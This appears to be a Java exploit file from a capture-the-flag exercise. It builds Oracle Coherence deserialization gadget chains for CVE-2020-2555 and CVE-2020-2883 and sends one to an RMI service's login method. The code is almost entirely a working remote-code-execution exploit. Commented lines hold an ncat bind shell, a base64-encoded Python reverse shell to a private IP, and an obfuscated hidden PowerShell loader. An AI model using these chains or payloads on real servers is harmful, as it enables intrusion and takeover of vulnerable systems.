import com.sleepycat.persist.evolve.Mutations;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.PriorityQueue;
import java.util.concurrent.ConcurrentNavigableMap;
import java.util.concurrent.ConcurrentSkipListMap;

public class ASCISPlayer {
    public ASCISPlayer() {
    }

    public static BadAttributeValueExpException CVE_2020_2883_v1() throws IOException, NotBoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        /**
         * javax.management.BadAttributeValueExpException.readObject()
         *   com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()
         *     java.util.concurrent.ConcurrentSkipListMap$SubMap.size()
         *     java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()
         *       java.util.concurrent.ConcurrentSkipListMap.cpr()
         *         com.tangosol.util.comparator.ExtractorComparator.compare()
         *           com.tangosol.util.extractor.ChainedExtractor.extract()
         *           com.tangosol.util.extractor.ReflectionExtractor().extract()
         *             Method.invoke()
         *             //...
         *           com.tangosol.util.extractor.ReflectionExtractor().extract()
         *             Method.invoke()
         *               Runtime.exec()
         */

        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"notepad.exe", "", ""}});

        ReflectionExtractor extractors[] = {extractor, extractor2, extractor3};
        ChainedExtractor chainedExt = new ChainedExtractor(extractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor  = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExt);

        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<String, String>();
        Field comparator = concurrentSkipListMap.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(concurrentSkipListMap, extractorComparator);



        //Method submapMethod = concurrentSkipListMap.getClass().getMethod("subMap", Object.class, boolean.class, Object.class, boolean.class);
        //submapMethod.invoke(concurrentSkipListMap, "foo", false, "bar", false);

        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap("foo",false,"bar", false);
        //
        Mutations mutations = new Mutations();
        Field renamers = mutations.getClass().getDeclaredField("renamers");
        renamers.setAccessible(true);
        renamers.set(mutations, subMap);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, mutations);

        FileOutputStream fos = new FileOutputStream("CVE_2020_2883_v1.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(badAttributeValueExpException);
        os.close();

        return badAttributeValueExpException;
    }

    public static Object CVE_2020_2883_v2()throws  IOException, NotBoundException, NoSuchFieldException, IllegalAccessException{

        /**
         * java.util.PriorityQueue.readObject()
         *   java.util.PriorityQueue.heapify()
         *   java.util.PriorityQueue.siftDown()
         *   java.util.PriorityQueue.siftDownUsingComparator()
         *   com.tangosol.util.extractor.AbstractExtractor.compare()
         *     com.tangosol.util.extractor.MultiExtractor.extract()
         *       com.tangosol.util.extractor.ChainedExtractor.extract()
         *         //...
         *         Method.invoke()
         *             //...
         *           Runtime.exec()
         */

        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"notepad.exe", "", ""}});

        ReflectionExtractor extractors[] = {extractor, extractor2, extractor3};
        ChainedExtractor chainedExt = new ChainedExtractor(extractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExt);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);


        //Serialize object & save to file
        FileOutputStream fos = new FileOutputStream("cve_2020_2883_v2.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(priorityQueue);
        os.close();

        return priorityQueue;
    }


    public static void CVE_2020_2883_v3() throws Exception{




        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "powershell.exe -nop -w hidden -noni -c \"notepad.exe\" "}});

        ReflectionExtractor extractors[] = {extractor, extractor2, extractor3};
        ChainedExtractor chainedExt = new ChainedExtractor(extractors);

    }


    public static BadAttributeValueExpException CVE_2020_2555() throws  IOException, NotBoundException, NoSuchFieldException, IllegalAccessException{
        //Create object:
        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});

        //Linux shell:
        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", "touch /tmp/Qynklee_POC" } });
        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", "ncat -lvp 4444 -e /bin/sh" } });
        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", " python -c \"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAsICAgICAgICBzdWJwcm9jZXNzICAgICAgICwgICAgICAgIG9zICAgICAgICAgOyAgaG9zdD0iMTkyLjE2OC44LjEwMCIgICAgICAgICA7ICBwb3J0PTI5MTEgICAgICAgICA7ICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgLCAgICAgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgICAgIDsgIHMuY29ubmVjdCgoaG9zdCAgICAgICAsICAgICAgICBwb3J0KSkgICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgLCAgICAgICAgMCkgICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgLCAgICAgICAgMSkgICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgLCAgICAgICAgMikgICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))\" " } });
        //Windows shell:
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"notepad.exe", "", ""}});
        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "powershell.exe -nop -w hidden -noni -ep bypass \"&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H{2}s{1}ANDcdmEC'+'A51WXW/bNhR996+{2}8LRaQixCNrChDZBirpJuAbLWqLzlwTAQWrqOtcikSlL+QOL/PlKiLDlO0GV6sUVennvuuR/UTzDmGxSLgoEPtyJVChnMd/BJ/0wKwVDAO7ika{2}Q/qEh2nY62jFXKGfyOyr/FeZylyBR0HjugH2cTwwV8wY3/df{2}Pxgr8yS7HL3SFelERbR+W9rUx+UviJS5okalQYKJ3UppJDeEoUeDBaiz{2}dkeeWej11kpt29k3FPM6tM{2}jlPtjKujKrf5P{1}yVSdj9zQr5aUZb0j1cjmcWcPVu85BuWcZqUq57FFDxGKcEKsOJJkaEh+JvrQWWSLsCt3YCP36E7T1nS9crN6lx5Nkulll9LfqFd7vT/FTGqRTx+QCXJJM5vrMVs+GEwOD1{1'+'}pKJCGb/Wc7lrU3TRshvFMeZKA1bpcCsq+9foClyjkHjK+ADdSvlLzMOxddQdfBiSwa/vyXsyC{1}Ju38RhnXcqAaUSSFeGbQVOdKFF5Zpm2fCr8lPRM7XStelokZMyi2qwV/hhXOia35GoNnWt/76z0E'+'WFfffRmWj0PfhUwvTozDdccYUhCpUu0pgq/JtmaUJN5YU0y+Y0fph53gt0yKhQS1O25tB{1}vqyM10pg{1}0kTUluz6XyncDqbOebXlF5AyDDQz9PPj8HeyoosqbfdqcKt{1}shinpi6P'+'j8fReH1tWek/mRs3O6tLlC+kdV0iJaYZSAKxrQ1aCEKqYu0C2fg{1}FufmzdmWvxMr+mcHDZivso'+'L1WzesZDnO5HeLxW{2}oQfDYPAL/JnGgku+UBBykXNRCkhgZDwaSwkCtYM1JuSO3TFbg1YTYkYWuk10/aDfvJAbZPdq2S6buoPbhXNSN2+Tano2gxsNabSx3U8OPN/OtT71mYsrGi815woU'+'UnaYLo1VQ9s87tFQ9kgdbTW/aiTv6Zqt+QP6V9tcayu13'+'g'+'eU/XEvvkmJ3jiCns5zyeKGx2UmPTKm'+'aqlXex97/zt1m2'+'Waoes6adkD1fFvSBO3qvg+BH1wjs55{2}DOE{2}CS3V{2}Y+JhMdymsXlZ0PxoSU{1}V7ZkBsU3eXUUGmh2TFVylyHA07qPSsrPRSMlicJA'+'L8euBX{2}8OO7ATzB10L5FSp'+'YKY6ghlAKUgNrkX+QAug1{1}Ft'+'DxEEhuJgGsyNnLdblPokzpML1XmJw0X7'+'Rjb/tnHbSfyqfBuaHrdMulZPGqc98zgq5PNzBdgzaOyXMuEQbT3MrRorn9VWovyM6h++HQ3LsRQi+vX7MAPkXyYgNWkMJAAA{0}')-f'=','I','4')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" "}});
        //ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "powershell.exe -nop -w hidden -noni -c \"notepad.exe\" "}});

        //Init ChainedExtractor ( 3 ReflectionExtractor )
        ReflectionExtractor extractors[] = {extractor, extractor2, extractor3};
        ChainedExtractor chainedExt = new ChainedExtractor(extractors);

        LimitFilter limitFilter = new LimitFilter();

        //chain 1: Set m_comparator = 1 chainedExtractor Object
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExt);

        //chain 2:
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        //chain 3:
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        //Serialize object & save to file
        FileOutputStream fos = new FileOutputStream("cve_2020_2555.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(badAttributeValueExpException);
        os.close();

        return badAttributeValueExpException;
    }

    public static void main(String[] args) throws IOException, NotBoundException, NoSuchFieldException, IllegalAccessException {


        BadAttributeValueExpException attackObj = CVE_2020_2555();

        //CVE_2020_2883_v2();

        //BadAttributeValueExpException attackObj = CVE_2020_2883_v1();


        String serverIP = "127.0.0.1";
        int serverPort = Integer.parseInt("1990");
        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf) registry.lookup("ascis");

        try {
            ascisInterf.login(attackObj);
        } catch (Exception e) {

        }
    }
}
